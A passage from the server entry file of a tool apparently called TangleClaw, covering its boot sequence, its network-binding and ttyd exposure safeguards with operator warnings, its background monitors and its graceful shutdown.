    console.error(`TangleClaw is already running (PID ${existingPid}). Exiting.`);
    process.exit(1);
  }
  pidfile.write();

  // Initialize file logging
  initFileLogging(path.join(store._getBasePath(), 'logs'));

  if (!envLogLevel && config.logLevel) {
    setLevel(config.logLevel);
  }

  // #397 credential durability (2026-07-03 lockout): in caddy mode, if the live
  // Caddyfile carries a basic_auth credential that the canonical config doesn't,
  // adopt it into config at boot — READ-ONLY on the Caddyfile. Makes the working
  // credential durable so every future regeneration (cutover, reset-admin)
  // re-emits the same hash instead of losing it with the file. Never overwrites
  // an existing config credential; non-throwing.
  if (config.ingressMode === 'caddy') {
    caddy.adoptCredentialIntoConfig();
  }

  // #500 — keep the ttyd attach script current in its non-TCC install path
  // (~/.tangleclaw/deploy/). ttyd opens this file per client-connect and is
  // denied Full Disk Access, so a repo-resident copy under ~/Documents freezes
  // ttyd in open() (all sessions black-screen after a ttyd restart). Running at
  // every boot means an update that bumps the repo script refreshes the copy on
  // the ensuing restart. Idempotent + non-throwing.
  ttydAttach.syncAttachScript({ repoDir: __dirname, home: os.homedir() });

  // Re-stamp the version into the status bar of sessions that already exist
  // (#745). A session sets its bar once, at creation, so every session that
  // survives an update would otherwise keep naming the version it was born
  // under — and surviving the update is the normal case, since the restart
  // that loads new code leaves tmux running. Boot is the only moment the
  // running version can change, so this needs no polling. Deliberately before
  // listen and synchronous, so a session attached in the first moments after a
  // restart already reads the right version rather than briefly showing the old
  // one: two `tmux` calls per session, ~6ms each, measured at ~58ms across ten
  // sessions. Non-throwing, so a tmux quirk cannot keep the server from
  // listening.
  try {
    tmux.refreshStatusBars();
  } catch (err) {
    log.warn('Status-bar refresh failed', { error: err.message });
  }

  // Pin the INSTALLED ttyd job to its configured interface (#710). install.sh
  // writes that plist once and an update is only a `git checkout`, so without
  // this an existing machine keeps serving a `--writable` terminal — one that
  // execs `tmux attach-session` — to its entire network, while the release notes
  // say otherwise. Same non-fatal contract as the attach-script sync above: it
  // refuses anything it does not recognize, backs up and validates before
  // touching the live job, and restores the previous one if ttyd does not come
  // back. Nothing here can affect the dashboard or this process.
  try {
    const ttydPlan = ttydBind.reconcileInstalledJob({
      home: os.homedir(),
      config,
      deps: {
        fs, path, execFileSync: require('node:child_process').execFileSync,
        uid: process.getuid ? process.getuid() : 0,
        log,
        // Confirm the job actually came back rather than assuming launchctl's
        // silence means success — a valid plist that launchd accepts can still
        // produce a ttyd that exits immediately.
        probe: (port) => {
          const { execFileSync } = require('node:child_process');
          // A missing probe tool is not a failed ttyd. Rolling back a good change
          // because `nc` is absent would be the tool breaking the thing it exists
          // to protect, so an unavailable prober means "unverified", not "dead".
          try {
            execFileSync('command', ['-v', 'nc'], { timeout: 1000, stdio: 'ignore', shell: true });
          } catch {
            log.warn('Skipped ttyd liveness verification — no `nc` on PATH', { port });
            return true;
          }
          const deadline = Date.now() + 5000;
          while (Date.now() < deadline) {
            try {
              execFileSync('nc', ['-z', '127.0.0.1', String(port)], { timeout: 1000, stdio: 'ignore' });
              return true;
            } catch { /* not up yet — retry until the deadline */ }
          }
          return false;
        }
      }
    });
    if (ttydPlan.action === 'refuse') {
      log.warn('Left the installed ttyd job alone', { reason: ttydPlan.reason });
      // Refusing is correct — guessing at an unrecognized job could take every
      // terminal down. But if the job it declined to touch is still listening on
      // every interface, that is an unauthenticated shell on the network, and a
      // log line reaches nobody who is looking at a browser.
      if (ttydPlan.stillWide) {
        serverInfo.setTtydNotice({
          setting: 'ttyd interface',
          severity: 'exposed',
          message: 'TangleClaw could not pin the terminal service to this machine, so it is still '
            + 'accepting connections from your whole network — and it opens a shell with no password. '
            + `TangleClaw did not change it because: ${ttydPlan.reason}. Fix it from a terminal on `
            + 'this machine, or reinstall TangleClaw to regenerate the service definition.'
        });
      }
    }
  } catch (err) {
    log.warn('ttyd bind reconciliation skipped', { error: err.message });
  }

  // Bootstrap port management — resolve actual port (env var takes precedence).
  // Shares the one derivation with every consumer that reports or injects this
  // port, so what we bind and what we tell operators/agents cannot diverge.
  const port = httpsSetup.effectiveServerPort(config);

  warnUnbindablePortEnv(port);
  // AUTH-1 (#395): the ttydPort lease is kept even in caddy mode, where ttyd is
  // socket-bound and nothing listens on :3100. This is deliberate — reserving the
  // port keeps it free so a rollback to direct mode rebinds cleanly, rather than
  // racing another project for it. (Critic warning, ADR 0003.)
  porthub.bootstrap({ ttydPort: config.ttydPort || 3100, serverPort: port });
  porthub.startExpirationTimer();

  // AUTH-1 (#395): in 'caddy' ingress mode Caddy terminates TLS and is the only
  // front door, so TC drops to plain HTTP (Caddy reaches it over the loopback).
  // 'direct' mode terminates its own HTTPS. The live cutover is operator-driven;
  // until ingressMode is flipped this branch is inert.
  // This decides the PROTOCOL only — which interfaces either mode binds is
  // lib/bind-policy.js's call, and is no longer implied by the ingress mode.
  const caddyMode = config.ingressMode === 'caddy';
  const effectiveHttps = caddyMode ? false : !!config.httpsEnabled;
  const server = createServer({
    httpsEnabled: effectiveHttps,
    certPath: config.httpsCertPath || null,
    keyPath: config.httpsKeyPath || null
  });

  // Start model status monitor
  modelStatus.startMonitor(store.engines.list(), config.modelStatusIntervalMs || 120000);

  // Start update checker (first check 60s after startup, then on an interval).
  // A rejected `updateCheckIntervalMs` is logged rather than silently swallowed —
  // an operator who set it deserves to know it didn't take.
  const checkInterval = updateChecker.resolveCheckInterval(config.updateCheckIntervalMs);
  if (checkInterval.warning) {
    log.warn(`Ignoring updateCheckIntervalMs: ${checkInterval.warning}`, { usingMs: checkInterval.intervalMs });
  }
  updateChecker.startChecker(checkInterval.intervalMs);

  // Start eval audit heartbeat watchdog
  evalAudit.startWatchdog((level, sessionId, project, message) => {
    log.warn('Eval audit watchdog alert', { level, sessionId, project, message });
  });

  // Start sidecar polling for active OpenClaw sessions
  sidecar.syncPolling();

  // Refresh the master's identity file on every boot, regardless of autoStart.
  // It embeds the TangleClaw API base URL, and only ensureMasterSession used to
  // rewrite it — so with autoStart off, an install whose effective port changed
  // kept telling the master to call a dead port until someone opened the master
  // (#726). Managed projects already heal below via syncAllProjects(); this is
  // the master's equivalent. skipIfAbsent so starting the server never creates
  // master state for an operator who has not used it.
  try {
    const refreshed = master.refreshMasterIdentity({ skipIfAbsent: true });
    if (refreshed.refreshed) log.debug('Master identity refreshed', { home: refreshed.home });
  } catch (err) {
    log.warn('Master identity refresh failed', { error: err.message });
  }

  // Project Master auto-start: launch the reserved master session at boot
  // when the operator opted in (master.autoStart). Failure is logged, never
  // fatal — the brain icon's on-demand ensure remains the fallback path.
  // ensureMasterSession types tmux/engine failures into result.error but can
  // still THROW on filesystem faults (home/memory/guardrail writes), so the
  // never-fatal claim needs the catch, matching the neighboring boot blocks.
  if (master.masterSettings(config).autoStart) {
    try {
      const result = master.ensureMasterSession();
      if (result.error) {
        log.warn('Master auto-start failed', { error: result.error });
      } else {
        log.info('Master auto-start', { created: result.created, engine: result.engine });
      }
    } catch (err) {
      log.warn('Master auto-start failed', { error: err.message });
    }
  }

  // Run retention policy on startup (purge old eval data)
  try {
    const retentionDays = store.DEFAULT_PROJECT_CONFIG.evalAuditMode.retentionDays || 90;
    const retentionResult = evalAudit.runRetentionPolicy(store, retentionDays);
    if (retentionResult.exchangesPurged > 0) {
      log.info('Startup retention policy', retentionResult);
    }
  } catch (err) {
    log.warn('Startup retention policy failed', { error: err.message });
  }

  // Sync all projects: ensure scaffolding + regenerate engine configs
  try {
    const syncResult = projects.syncAllProjects();
    if (syncResult.synced > 0) {
      log.info('Startup project sync', syncResult);
    }
    if (syncResult.errors.length > 0) {
      log.warn('Startup project sync errors', { errors: syncResult.errors });
    }
  } catch (err) {
    log.warn('Startup project sync failed', { error: err.message });
  }

  // Stranded-config guard (#592): governance files in unregistered ancestor
  // dirs re-inject stale rules into nested projects' sessions (Claude Code
  // loads every ancestor CLAUDE.md). Detection only — see the API route.
  try {
    const strandedResult = projects.scanForStrandedConfigs();
    for (const s of strandedResult.stranded) {
      log.warn('Stranded governance config in ancestor dir (#592)', {
        dir: s.dir,
        files: s.files,
        affectedProjects: s.affectedProjects
      });
    }
  } catch (err) {
    log.warn('Stranded-config scan failed', { error: err.message });
  }

  // Start document lock expiry timer (every 5 minutes)
  const _lockExpiryInterval = setInterval(() => {
    try {
      store.documentLocks.expireStale();
    } catch (err) {
      log.warn('Lock expiry sweep failed', { error: err.message });
    }
  }, 5 * 60 * 1000);

  // Describe the socket that exists, not the one the config asked for.
  const protocol = serverProtocol(server);
  const servingHttps = protocol === 'https';
  // Record the legacy install's "never chosen" state as a real value before
  // anything reads it. Absence of the key identifies such an install exactly
  // once — the next config save of any kind would materialize the default and
  // erase the distinction — so it is converted to an explicit null here and
  // persisted. Everything downstream reads the value, never the file.
  const legacyBind = bindPolicy.migrateLegacyBind(
    config,
    store.config.isKeyPersisted(bindPolicy.OPT_IN_KEY)
  );
  if (legacyBind.migrated) {
    try {
      store.config.save(config);
      log.info('Recorded this install as predating the network-binding setting', {
        setting: bindPolicy.OPT_IN_KEY, reason: legacyBind.reason
      });
    } catch (err) {
      // Non-fatal: the in-memory value still drives this boot correctly, so the
      // operator keeps their access and the warning below still fires. It will
      // simply be re-attempted next start.
      log.warn('Could not persist the network-binding grace state — will retry next start', {
        error: err.message
      });
    }
  }

  const bind = bindPolicy.resolveBind(config);
  const bindHost = bind.host;
  const bindLabel = bind.label;

  // An opt-in that caddy mode overrode is refused out loud. Silently ignoring it
  // would leave the config claiming one thing while the socket does another —
  // and the operator believing they had reopened remote access when they had not.
  if (bind.refusedOptIn) {
    log.warn(
      `Ignoring "${bindPolicy.OPT_IN_KEY}": true — Caddy is the ingress in this mode and holds the `
      + 'login gate, so binding every interface would expose an ungated socket beside it. '
      + 'Reach TangleClaw through Caddy, or set "ingressMode": "direct" to bind directly.',
      { ingressMode: config.ingressMode }
    );
  }

  // A non-boolean opt-in reads as "not opted in", which is the safe choice — but
  // the operator who typed it believes they reopened the door, so say otherwise.
  if (bind.malformedOptIn) {
    log.warn(
      `Ignoring "${bindPolicy.OPT_IN_KEY}" — it must be a boolean (true or false, unquoted). `
      + 'TangleClaw is treating this as not-opted-in and binding loopback only.',
      { setting: bindPolicy.OPT_IN_KEY, type: typeof config[bindPolicy.OPT_IN_KEY] }
    );
  }

  // An install written before this key existed is still bound wide, deliberately
  // (ADR 0009's 2026-07-28 amendment) — narrowing it would take away the remote
  // access its operator may be using to read this very dashboard, before the
  // credential gate exists to replace it. That is a bounded exposure window, not
  // an accepted state, so it is reported on every boot and on the dashboard until
  // the operator resolves it. Unlike the terminal listener, which is pinned
  // immediately because nothing external addresses it.
  const bindNotice = bindPolicy.describeNarrowing(config);
  if (bindNotice) {
    log.warn(bindNotice.message, { setting: bindNotice.setting, severity: bindNotice.severity });
  }
  serverInfo.setBindNotice(bindNotice);

  server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
      log.error(`Port ${port} is already in use — another process is bound to it. Exiting.`);
      pidfile.remove();
      process.exit(1);
    }
    throw err;
  });

  const onListening = () => {
    log.info(`TangleClaw v${_getVersion()} listening on ${protocol}://${bindLabel}:${port}${caddyMode ? ' (behind Caddy)' : ''}`, {
      node: process.version,
      pid: process.pid,
      https: servingHttps,
      // #864 — the names state-changing requests and WebSocket upgrades are
      // accepted under. Logged because this list is DERIVED (from
      // `certHostUnion` — the certificate's own names, the mkcert defaults, the
      // mDNS name and the two configured public names — plus the bare machine
      // name), and a derivation that misses a legitimate address refuses writes
      // from it. That reads as "the
      // dashboard is broken" unless the operator can see what the server
      // believes it serves. Printing it costs one line and turns a silent
      // refusal into a diff against reality.
      servedHosts: [...httpsSetup.servedHostAllowlist(config)].sort().join(', '),
      // Surfaced only when intent and reality diverge, so the listen line
      // points back at the fallback WARN logged during construction rather
      // than leaving the operator to notice the mismatch themselves.
      ...(effectiveHttps && !servingHttps ? { httpsFallback: true } : {}),
      ingressMode: config.ingressMode || 'direct',
      // WHY this host, not just which one. An operator reading a log to find out
      // why they cannot reach the dashboard needs the reason and the setting
      // that changes it, otherwise the line states the symptom and withholds the
      // cause. `grace` in particular is the one worth spotting: it means the
      // machine is still wide open and nobody has decided yet.
      bind: bind.reason,
      bindSetting: bindPolicy.OPT_IN_KEY
    });
    // Start ttyd zombie-child watcher (#94). macOS-only; no-op elsewhere.
    ttydWatcher.start();
    // Start OpenClaw tunnel liveness monitor (#294) — auto-recreates tunnels
    // that die out from under an open Web UI so they self-heal without a
    // manual re-launch.
    tunnelMonitor.start();
    // Start the typed-wrap sentinel monitor (CC-7 Slice C) — watches live
    // sessions for the `TANGLECLAW_WRAP` marker and raises a per-project flag
    // that the session view's status poll turns into an opened wrap drawer.
    wrapSentinel.start();
    // Start the Medusa wake-nudge monitor (MED-2K9P v2 T2) — idle-gated inbox
    // watcher that types a fixed nudge into an opted-in (`medusaWake`) session
    // when fresh inbound mail is waiting and the pane is at a bare prompt.
    medusaWake.start();
    // Re-sync Medusa listeners for live sessions (TC#550, MED-2K9P v2 T4) —
    // listeners are in-memory, so without this a server restart silently
    // deregistered every running session from the switchboard.
    sessions.resyncMedusaListeners();
    // Resolve the operator's login PATH once, here, so no request ever pays for
    // it. launchd hands this service `/usr/bin:/bin:/usr/sbin:/sbin`, which
    // contains none of the places an engine CLI actually installs (#346) — and
    // reading the real PATH means starting their shell and running their
    // profile, which is unbounded work that must not happen on the event loop
    // inside a route. Fire-and-forget: detection falls back to this process's
    // own PATH until it lands, which is exactly what it did before.
    engines.refreshDetectionPath().catch((err) => {
      log.warn('Could not resolve the login PATH at boot; engine detection will see only '
        + 'the PATH launchd gave this service', { error: err && err.message });
    });
  };

  // Loopback unless something is guarding the door — see lib/bind-policy.js.
  // A null host is Node's "every interface", reached only via the explicit opt-in.
  if (bindHost) {
    server.listen(port, bindHost, onListening);
  } else {
    server.listen(port, onListening);
  }

  // Graceful shutdown
  const shutdown = () => {
    log.info('Shutting down');
    pidfile.remove();
    porthub.shutdown({ ttydPort: config.ttydPort || 3100, serverPort: port });
    porthub.stopExpirationTimer();
    modelStatus.stopMonitor();
    updateChecker.stopChecker();
    evalAudit.stopWatchdog();
    sidecar.stopAllPolling();
    ttydWatcher.stop();
    tunnelMonitor.stop();
    wrapSentinel.stop();
    medusaWake.stop();
    clearInterval(_lockExpiryInterval);
    server.close();
    store.close();
    process.exit(0);
  };

  process.on('SIGTERM', shutdown);
  process.on('SIGINT', shutdown);
  process.on('uncaughtException', (err) => {
    log.error('Uncaught exception', { error: err.message, stack: err.stack });
  });
  process.on('unhandledRejection', (reason) => {
    log.error('Unhandled rejection', { error: String(reason) });
  });
}

module.exports = { createServer, serverProtocol, warnUnbindablePortEnv, handleRequest, handleUpgrade, route, matchRoute, jsonResponse, errorResponse, parseBody, parseQuery, reqUrl, MAX_BODY_SIZE, _setRestartScheduler, _setCutoverSpawner, _openclawProxyHeaders, _openclawWsRequestLines, _hostIsAllowed, _servedHostsOrEmpty };
